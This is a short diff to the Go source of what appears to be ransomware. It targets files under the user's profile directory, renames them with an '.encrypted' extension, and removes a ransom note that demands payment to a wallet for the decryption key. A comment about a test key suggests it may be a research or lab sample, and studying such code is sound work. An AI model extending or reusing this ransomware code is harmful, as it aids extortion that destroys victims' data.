@@ -1,3 +1,5 @@
+//
+
 package main
 
 import (
@@ -13,25 +15,6 @@ var (
 	MatchedFiles          = []string{}
 	EncryptionExtension   = ".encrypted"
 	BaseDir               = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))
-	EncMessage            = `
-	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG 
-	AES-256 ALGORITHM.
-
-	YOUR IDENTIFICATION IS %s
-
-	PLEASE SEND %s TO THE FOLLOWING WALLET 
-
-			      %s
-
-	TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
-	FILES
-
-	# The enc key is inserted for testing
-	# ENCRYPTION KEY: %s
-
-	AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
-	%s decrypt yourkeyhere
-	`
 )
 
 func main() {
